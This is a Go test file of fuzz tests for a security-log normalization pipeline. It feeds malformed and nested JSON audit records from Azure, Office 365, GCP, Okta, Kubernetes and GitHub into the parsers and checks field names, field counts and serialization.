	f.Add(`{"records": [` + azureAuditRecord + `]}`)
	f.Add(`{"records": [{"time": 1, "category": [], "operationName": {}, "tenantId": null, "properties": [1, {"a": {"b": {"c": {"d": {"e": 1}}}}}]}]}`)
	f.Add(`{"records": [{"time": "x", "category": "SignInLogs", "operationName": "x", "tenantId": "t", "properties": {"status": "x", "authenticationDetails": [1], "initiatedBy": {"user": 1}}}]}`)
	f.Fuzz(func(t *testing.T, msg string) {
		recs := AzureRecords([]byte(msg))
		for _, r := range recs {
			ev := ParseAzure(r)
			if ev.Model == "" || ev.Fields["message"] == nil {
				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
			}
			if _, err := json.Marshal(ev.Document()); err != nil {
				t.Fatal(err)
			}
			if len(ev.Fields) > maxFieldsPerEvent {
				t.Fatalf("%d fields", len(ev.Fields))
			}
			for k := range ev.Fields {
				if !KnownField(k) && !validFieldName(k) {
					t.Fatalf("field name %q", k)
				}
			}
		}
		b64 := azureFromOTLP(base64.StdEncoding.EncodeToString([]byte(msg)))
		if len(b64) != len(recs) && strings.HasPrefix(msg, "{") {
			t.Fatalf("%d records from base64, %d from text", len(b64), len(recs))
		}
	})
}

func FuzzO365Records(f *testing.F) {
	f.Add(`[` + o365LoginFailed + `, ` + o365InboxRule + `, ` + o365Alert + `]`)
	f.Add(`[{"Id": 1, "CreationTime": [], "Operation": {}, "Workload": null, "ClientIP": "[::1", "Parameters": "x", "ExtendedProperties": [1, {"Name": 2}]}]`)
	f.Add(`[{"RecordType": "x", "Operation": "New-", "ResultStatus": 1, "Item": {"A": {"B": {"C": {"D": {"E": {"F": 1}}}}}}}]`)
	f.Fuzz(func(t *testing.T, msg string) {
		recs, err := O365Records([]byte(msg))
		if err != nil {
			return
		}
		for _, r := range recs {
			ev := Normalize(O365Tag, r, now)
			if ev.Model == "" {
				t.Fatalf("no model, fields %v", ev.Fields)
			}
			if _, err := json.Marshal(ev.Document()); err != nil {
				t.Fatal(err)
			}
			if len(ev.Fields) > maxFieldsPerEvent {
				t.Fatalf("%d fields", len(ev.Fields))
			}
			for k := range ev.Fields {
				if !KnownField(k) && !validFieldName(k) {
					t.Fatalf("field name %q", k)
				}
			}
		}
	})
}

func FuzzGCPEntry(f *testing.F) {
	f.Add(gcpFirewallDelete)
	f.Add(gcpBucketListDenied)
	f.Add(gwsGrantAdmin)
	f.Add(gwsLoginFailure)
	f.Add(`{"logName": "organizations/1/logs/x", "resource": {}, "protoPayload": {"metadata": {"event": {"eventName": 1, "parameter": [{"name": "A.B", "value": "x"}, {"name": "", "multiValue": [null, {}]}, 3]}}}}`)
	f.Add(`{"message": {"data": "` + base64.StdEncoding.EncodeToString([]byte(gcpBucketListDenied)) + `"}}`)
	f.Add(`{"logName": "projects/p/logs/", "resource": {}, "protoPayload": {"status": {"code": "x"}, "authorizationInfo": [1, {"a": [{"b": 2}]}]}, "labels": {"a": {"b": 1}}}`)
	f.Add(`{"logName": "/logs/%zz", "resource": {"labels": []}, "protoPayload": {"methodName": ".", "request": {"a": {"b": {"c": {"d": {"e": 1}}}}}}}`)
	f.Add(`{"message": {"data": "` + base64.StdEncoding.EncodeToString([]byte(gcpDeep(1000))) + `"}}`)
	f.Add(gwsManyEvents(50))
	f.Fuzz(func(t *testing.T, msg string) {
		d := json.NewDecoder(strings.NewReader(msg))
		d.UseNumber()
		var r map[string]any
		if d.Decode(&r) != nil || r == nil {
			return
		}
		ev := Normalize(GCPTag, r, now)
		if GCPEntry(r) == nil {
			// Not an entry: a generic event, whose names the pipeline's
			// field checks look after.
			return
		}
		if ev.Model == "" || ev.Fields["message"] == nil {
			t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
		}
		if _, err := json.Marshal(ev.Document()); err != nil {
			t.Fatal(err)
		}
		if len(ev.Fields) > maxFieldsPerEvent {
			t.Fatalf("%d fields", len(ev.Fields))
		}
		for k := range ev.Fields {
			if !KnownField(k) && !validFieldName(k) {
				t.Fatalf("field name %q", k)
			}
		}
		// The same text as an OTLP body is an entry only if it is one.
		if e := gcpFromOTLP(msg); e != nil && !IsGCPRecord(e) {
			t.Fatalf("entry from text %v", e)
		}
	})
}

func FuzzOktaRecord(f *testing.F) {
	f.Add(oktaSignInFailed)
	f.Add(oktaFactorDeactivated)
	f.Add("[" + oktaThreat + "," + oktaSignInFailed + "]")
	f.Add(`{"uuid": "u", "published": "p", "eventType": "e", "actor": {}, "target": [1, {"a": [{"b": 2}]}, null], "debugContext": {"debugData": {"a.b": 1, "": 2, "c{}": 3}}}`)
	f.Add(`{"uuid": 1, "published": 2, "eventType": "user.session.start", "actor": {"alternateId": {"x": 1}}, "outcome": {"result": []}, "client": {"userAgent": "x"}}`)
	f.Add(`{"uuid": "u", "published": "p", "eventType": "e", "actor": ` + strings.Repeat(`{"a": `, 40) + "1" + strings.Repeat("}", 40) + `}`)
	f.Fuzz(func(t *testing.T, msg string) {
		recs, err := OktaRecords([]byte(msg))
		if err != nil {
			recs = nil
		}
		d := json.NewDecoder(strings.NewReader(msg))
		d.UseNumber()
		var r map[string]any
		if d.Decode(&r) == nil && r != nil {
			recs = append(recs, r)
		}
		for _, r := range recs {
			ev := Normalize(OktaTag, r, now)
			if !IsOktaRecord(r) {
				// Not an event: a generic event, whose names the
				// pipeline's field checks look after.
				continue
			}
			if ev.Fields["sourcetype"] != OktaSourcetype || ev.Fields["message"] == nil || ev.ID == "" {
				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
			}
			if _, err := json.Marshal(ev.Document()); err != nil {
				t.Fatal(err)
			}
			if len(ev.Fields) > maxFieldsPerEvent {
				t.Fatalf("%d fields", len(ev.Fields))
			}
			for k := range ev.Fields {
				if !KnownField(k) && !validFieldName(k) {
					t.Fatalf("field name %q", k)
				}
			}
		}
		// The same text as an OTLP body is events only if it holds them.
		for _, e := range oktaFromOTLP(msg) {
			if !IsOktaRecord(e) {
				t.Fatalf("event from text %v", e)
			}
		}
	})
}

func FuzzKubernetesRecord(f *testing.F) {
	f.Add(kubePodCreated)
	f.Add(kubeAnonymous)
	f.Add(`{"kind": "EventList", "apiVersion": "audit.k8s.io/v1", "items": [` + kubeUnauthenticated + "," + kubeAnonymous + "]}")
	f.Add("[" + kubeAnonymous + "," + kubeUnauthenticated + "]")
	f.Add(`{"kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": "a", "verb": "v", "stage": "s", "user": "x", "sourceIPs": "y",
		"objectRef": [1, {"a": [{"b": 2}]}], "annotations": {"a.b": {"c": 1}, "": 2, "c{}": 3, "a.b.c": "d"},
		"requestObject": {"spec": {"containers": [null, "x", {"image": {"a": 1}}], "a.b": 1}, "metadata": "m"}, "responseObject": [1]}`)
	f.Add(`{"kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": 1, "verb": "create", "stage": "s", "responseStatus": {"code": "x"}}`)
	f.Add(`{"kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": "a", "verb": "v", "stage": "s", "requestObject": ` +
		strings.Repeat(`{"a": `, 40) + "1" + strings.Repeat("}", 40) + `}`)
	f.Fuzz(func(t *testing.T, msg string) {
		recs, err := KubernetesRecords([]byte(msg))
		if err != nil {
			recs = nil
		}
		d := json.NewDecoder(strings.NewReader(msg))
		d.UseNumber()
		var r map[string]any
		if d.Decode(&r) == nil && r != nil {
			recs = append(recs, r)
		}
		// And as a line Fluent Bit read from the audit log file.
		if l := kubeLine(map[string]any{"log": msg}); l["log"] == nil {
			recs = append(recs, l)
		}
		for _, r := range recs {
			ev := Normalize(KubernetesTag, r, now)
			if !IsKubernetesRecord(r) {
				// Not an event: a generic event, whose names the
				// pipeline's field checks look after.
				continue
			}
			if ev.Fields["sourcetype"] != KubernetesSourcetype || ev.Fields["message"] == nil || ev.ID == "" {
				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
			}
			if _, err := json.Marshal(ev.Document()); err != nil {
				t.Fatal(err)
			}
			if len(ev.Fields) > maxFieldsPerEvent {
				t.Fatalf("%d fields", len(ev.Fields))
			}
			for k := range ev.Fields {
				if !KnownField(k) && !validFieldName(k) {
					t.Fatalf("field name %q", k)
				}
				if knownObjects[k] {
					t.Fatalf("value %q where a known field has an object", k)
				}
			}
		}
		// The same text as an OTLP body is events only if it holds them,
		// and as a webhook's body an EventList's items are an array.
		for _, e := range kubernetesFromOTLP(msg) {
			if !IsKubernetesRecord(e) {
				t.Fatalf("event from text %v", e)
			}
		}
		if items, ok := kubeEventListItems([]byte(msg)); ok && (len(items) == 0 || items[0] != '[') {
			t.Fatalf("items %q", items)
		}
	})
}

func FuzzGitHubEvent(f *testing.F) {
	f.Add(githubRepoDestroy)
	f.Add(githubDisable2FA)
	f.Add("[" + githubFailedLogin + "," + githubDisable2FA + "]")
	f.Add(strings.ReplaceAll(githubDisable2FA, "\n", "") + "\n" + strings.ReplaceAll(githubFailedLogin, "\n", ""))
	f.Add(`{"action": "a.b", "created_at": "x", "org": {"a": [1, {"b": [{"c": 2}]}, null]}, "actor": {"x": 1}, "src": {"y": 2}, "github_actor": [1], "": 3, "a.b": 4, "_": 5, "@": 6}`)
	f.Add(`{"action": "repo.create", "@timestamp": 1e300, "created_at": -1, "business": 1, "user": {"login": "x"}, "user_agent": [{"a": 1}]}`)
	f.Add(`{"action": "repo.create", "created_at": 1, "org": ` + strings.Repeat(`{"a": `, 40) + "1" + strings.Repeat("}", 40) + `}`)
	f.Fuzz(func(t *testing.T, msg string) {
		recs, err := GitHubRecords([]byte(msg))
		if err != nil {
			recs = nil
		}
		d := json.NewDecoder(strings.NewReader(msg))
		d.UseNumber()
		var r map[string]any
		if d.Decode(&r) == nil && r != nil {
			recs = append(recs, r)
		}
		for _, r := range recs {
			ev := Normalize(GitHubTag, r, now)
			if !isGitHubEvent(r) {
				// Not an event: a generic event, whose names the
				// pipeline's field checks look after.
				continue
			}
			if ev.Fields["sourcetype"] != GitHubSourcetype || ev.Fields["message"] == nil || ev.ID == "" {
				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
			}
			if _, err := json.Marshal(ev.Document()); err != nil {
				t.Fatal(err)
			}
			if len(ev.Fields) > maxFieldsPerEvent {
				t.Fatalf("%d fields", len(ev.Fields))
			}
			for k, v := range ev.Fields {
				if !KnownField(k) && !validFieldName(k) {
					t.Fatalf("field name %q", k)
				}
				if _, isMap := v.(map[string]any); isMap || knownObjects[k] {
					t.Fatalf("field %s holds a value where an object is mapped", k)
				}
				// ({} is part of a name: config{} is not config.)
				for i := range len(k) {
					if k[i] != '.' {
						continue
					}
					if typ, ok := knownFields[k[:i]]; ok && typ != "object" {
						t.Fatalf("%s is under %s, mapped as %s", k, k[:i], typ)
					}
					if _, ok := ev.Fields[k[:i]]; ok {
						t.Fatalf("%s is under the field %s", k, k[:i])
					}
				}
			}
		}
		// The same text as an OTLP body is events only if it holds them.
		for _, e := range githubFromOTLP(msg) {
			if !IsGitHubRecord(e) {
				t.Fatalf("event from text %v", e)
			}
		}
	})
}
